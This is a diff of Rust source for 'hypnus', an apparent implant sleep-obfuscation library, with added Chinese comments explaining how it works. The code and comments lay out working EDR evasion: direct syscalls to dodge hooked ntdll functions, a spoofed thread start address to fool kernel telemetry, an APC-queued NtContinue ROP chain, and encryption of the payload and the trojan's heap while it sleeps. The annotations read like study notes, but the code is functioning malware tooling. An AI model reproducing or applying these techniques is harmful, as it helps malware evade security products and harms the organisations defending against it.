@@ -49,9 +49,16 @@ use crate::allocator::HypnusHeap;
 ///     timer!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
 /// }
 /// ```
+/// 
+/// #[macro_export],代表编译器属性,rust中宏默认只在定义它的模块中可见.这里宏会被提升到库的根作用域.后续可在自己项目任何地方通过use hypnus::timer;调用这个宏
 #[macro_export]
 macro_rules! timer {
+
+    // rust不支持函数重载(函数重名,但参数不同),这里通过宏,实现了接口重载
+    // 第一个匹配分支arms,接收三个参数.这种情况将第五个参数Obfuscation默认置为None(默认无额外混淆)
+    // 调用timer!时,rustc在编译阶段(AST生成时),会展开替换为匹配的代码
     ($base:expr, $size:expr, $time:expr) => {
+        // $crate宏的绝对位置,无论在什么位置被调用,一律去hypnus库根目录下查找对应的路径.保证该宏在跨项目调用的路径绝对安全
         $crate::__private::hypnus_entry(
             $base, 
             $size, 
@@ -60,7 +67,7 @@ macro_rules! timer {
             $crate::ObfMode::None
         )
     };
-
+    // 第二个Arms,接收四个参数
     ($base:expr, $size:expr, $time:expr, $mode:expr) => {
         $crate::__private::hypnus_entry(
             $base, 
@@ -177,6 +184,8 @@ macro_rules! foliage {
 }
 
 /// Enumeration of supported memory obfuscation strategies.
+/// 
+/// 驱动休眠混淆的底层调度方式(线程池/APC),并用于在fiber入口路由核心执行框架.无论选择Timer还是Foliage,核心主载荷的加密方式都是写死的(rop链中的SystemFunction040).
 pub enum Obfuscation {
     /// The technique using Windows thread pool (`TpSetTimer`).
     Timer,
@@ -189,8 +198,12 @@ pub enum Obfuscation {
 }
 
 /// Represents bit-by-bit options for performing obfuscation in different modes
+/// 
+/// 混淆中是否开启额外的内存操作特权(私有堆独立加密/主载荷的rwx权限妥协).ObfMode无法改变主代码段的加密方式,控制的时额外的内存操作特权.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
+// 透明内存布局,强制ObfMode结构体的内部布局和定义的内部字段完全一致,避免rustc的优化(在物理内存中的大小/对齐/abi与u32一致,不能有多余padding).即固定ObfMode中u32的值和物理内存属性
 #[repr(transparent)]
+// 元组结构体
 pub struct ObfMode(pub u32);
 
 impl ObfMode {
@@ -226,7 +239,7 @@ impl core::ops::BitOr for ObfMode {
 
 /// Structure responsible for centralizing memory obfuscation techniques
 /// 
-/// 将指定代码段(base,size表示)
+/// 代表将指定代码段(base,size表示)的混淆状态机.这个结构体封装了目标载荷的物理坐标(base/size),休眠时钟(timer),底层api寻址路由表(cfg),防御战术配置(mode).所有具体执行流(timer/wait/foliage)都作为该实体的方法挂在其上
 #[derive(Clone, Copy, Debug)]
 struct Hypnus {
     /// Base memory pointer to be manipulated or operated on.用户想要混淆的内存区域的首地址指针
@@ -917,6 +930,8 @@ impl Hypnus {
     }
 
     /// Performs memory obfuscation using APC injection and hijacked thread contexts.
+    /// 
+    /// foliage意为树叶;这里thread是树枝,apc就是挂在这个树枝上的树叶.主线程不动,创建了一个挂起的新线程,然后把10个rop上下文像树叶一样逐个放入新线程的apc序列.当新线程解出挂起,这些树叶就会顺序执行
     fn foliage(&mut self) -> Result<()> {
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
@@ -943,14 +958,20 @@ impl Hypnus {
 
             // Create a new thread in suspended state for APC injection
             let mut h_thread = null_mut::<c_void>();
+            // 使用uwd的直接系统调用.常规的创建线程使用的createthread(底层使用ntdll.dll!NtCreateThreadEx),edr会在这个ex函数开头inline hook,监视进程是否悄悄创建线程.这里不经过ntdll.dll导出函数,通过uwd的syscall切入ring0
             status = uwd::syscall!(
                 obf!("NtCreateThreadEx"),
                 h_thread.as_ptr_mut(),
+                // 申请最高权限,后续能放入apc
                 THREAD_ALL_ACCESS,
                 null_mut::<c_void>(),
+                // 挂在到当前进程
                 NtCurrentProcess(),
+                // edr的etw-ti发现有新线程创建时,重点检查该线程起始地址startaddress.如果将新线程的startaddress放入这里新申请的rwx内存中.edr会检测到新线程的起始地址不在ntdll,而报异常.
+                // 这里在ntdll中找到TpReleaseCleanupGroupMembers函数地址,并加上0x250的偏移构建新地址.新地址可能是某个内存gadget.当内核记录这个新线程的诞生时,发现是由ntdll中某个合法线程池维护函数发起的新线程
                 (self.cfg.tp_release_cleanup.as_ptr()).add(0x250),
                 null_mut::<c_void>(),
+                // 挂起新线程(因为填入的startaddress是假的).
                 1,
                 0,
                 0x1000 * 20,
@@ -998,9 +1019,11 @@ impl Hypnus {
             ctxs[0].Rdx = 0;
             ctxs[0].R8  = 0;
 
-            // Temporarily makes the target memory region writable before encryption
+            // Temporarily makes the target memory region writable before encryption:下一步加密前的内存改为rw
             let mut old_protect = 0u32;
+            // 调用者传入
             let (mut base, mut size) = (self.base, self.size);
+            // fn timer()中需要jmp()间接跳转.但foliage走apc队列,内核在派发apc时,直接将context覆盖到挂起的线程上,直接设置ip即可
             ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
             ctxs[1].Rcx = NtCurrentProcess() as u64;
             ctxs[1].Rdx = base.as_u64();
@@ -1061,12 +1084,30 @@ impl Hypnus {
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
 
             // Queue each CONTEXT as an APC to be executed in sequence
+            // apc在win内核中是队列queue.可向一个线程连续发送多个apc任务.当这个线程进入可警告状态Altertable被唤醒,它会按顺序(FIFO)将queue中任务逐个执行.这种顺序契合rop链的时序要求
+            // 后续通过NtAlertResumeThread唤醒被挂起的线程后.内核发现被唤醒的线程的apc队列中有任务.内核提取队列中第一个任务,然后内核代表该线程执行NtContinue(ctxs[0]中的NtWaitForSingleObject).但,当NtWaitForSingleObject执行完,应该实行ret,此时的NtContinue已经破坏了栈.需要给cpu指令去执行apc的cyxs[1].这是通过spoof.rs中针对foliage的(ctx.rsp as *mut u64).write(cfg.nt_test_alert.into()); ctx.rsp
+            // 这是apc链执行的灵魂.在spoof.rs这段中,伪造了每个CONTEXT的物理栈顶时,把ntdll.dll!NtTestAlert这个函数地址放入rsp.当NtWaitForSingleObject执行完ret时,从栈顶返回的地址就是指定NtTestAlert.
+            // NtTestAlert是os主动检查并清空当前线程apc队列的函数.此时调用它,会提取队列中的下一个任务.以此继续循环调用
+            
             for ctx in &mut ctxs {
-                status = NtQueueApcThread(
+                status = 
+                // undocumented api:允许进程A强行命令进程B(或同进程的另一线程)执行某段代码
+                // fn timer()中使用了线程池(TpAllocTimer),在线程池唤醒线程执行回调时使用了TimerCallback(rcx(instance)/rdx(context)/r8/r9),其内部将参数传给目标函数NtContinue(rcx(context)/rdx).不使用trampoline(mov rcx,rdx)的话,线程池会把instance传给NtContinue的context导致错位
+                // 在foliage中,使用的是NtQueueThread,在这个层面rustc并不知道win的fastcall/syscall以及它们的参数调用约定.其生成的汇编是call <NtQueueThread地址>.既然用了call,在写源码的时候就需要隐式遵守fastcall,之后进入ntdll.dll!NtQueueThread,在这里开始的动作就是mov r10,rcx 和mov eax,0x45(ssn放入eax)和syscall(切入内核执行真正的硬件级系统调用指令)和ret.即syscall的参数是r10/rax/r8/r9
+                // 
+                NtQueueApcThread(
+                    // 目标进程:前面创建的挂起的线程句柄
                     h_thread,
+                   // 要执行的函数:如果直接填入shellcode地址.edr直接报异常.但这里用NtContinue的真实物理地址.NtContinue把当前cpu状态丢弃,强制替换为传入的状态
                     self.cfg.nt_continue.as_ptr().cast_mut(),
+                    // 传给要执行函数的第一个参数:给NtContinue(NtContinue只接收一个参数,一个context结构体指针),这里指上面构造的十个ctx
+                    // 
+                    // ctxs是10个context的数组.此时ctxs类型是&mut CONTEXT; as *mut _,剥离rust安全审查,转为raw pointer._表示让rustc自动推导类型
+                    // as *mut c_void.把带有CONTEXT类型标签的裸指针,转为对应c的void* 裸指针
                     ctx as *mut _ as *mut c_void,
+                    // 传给要执行函数的第二个参数
                     null_mut(),
+                    // 函数第三个参数
                     null_mut(),
                 );
 
@@ -1076,12 +1117,19 @@ impl Hypnus {
             }
 
             // Trigger the APC chain by resuming the thread in alertable state
+            //NtQueueApcThread(r8=context),之后内核代为执行NtAlertResumeThread中NtContinue.将r8给了rcx.这是内核传递的
+            // 这并不是通过简单的mov rcx,r8完成的(因为在休眠期间,cpu的r8已经被其他程度用很多次).而是当调用NtQueueApcThread时,内核会将r8中的ctx这个信息存入内核高权限内存非分页池中的KAPC(kernel apc)结构体,然后释放r8.当NtAlertResumeThread开始时,内核唤醒线程查看KAPC.内核会根据win64的fastcall,将对应的内容写入rcx,并跳入NtContine执行.即API 接口的R8（参数位置），在时间流转之后，被操作系统以契约的形式，物理转移到了执行接口的 RCX 中
             status = NtAlertResumeThread(h_thread, null_mut());
             if !NT_SUCCESS(status) {
                 bail!(s!("NtAlertResumeThread Failed"));
             }
 
             // If heap obfuscation is enabled, encrypt memory before execution
+            // 位于NtAlertResumeThread唤醒傀儡线程,apc链开始子还行后.
+            // 主线程立即执行私有堆加密,之后会挂起主线程,等到混淆链执行结束的信号
+            // 这里堆加密没有放入apc队列,而是由主线程执行:主载荷在内存中是一块连续的内存,os的SystemFunction040可以直接传入base和size执行加密.而堆内存是高度碎片化的.
+            // hypnus.rs中内存被分为主载荷区(代码段.text):存放调用os api的逻辑.这部分在休眠前由apc队列的SystemFunction040加密;私有堆(HypnusHeap),是堆加密目标,放的是木马在运行时动态产生的数据
+            // 而apc队列(此处基于NtContinue的rop链,传入apc链的CONTEXT,其本质时给cpu一些硬编码的指令)只会静态执行,而堆加密必须动态计算(需要调用obfuscate_heap遍历内存的状态)
             let key = if heap {
                 let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                 obfuscate_heap(&key);
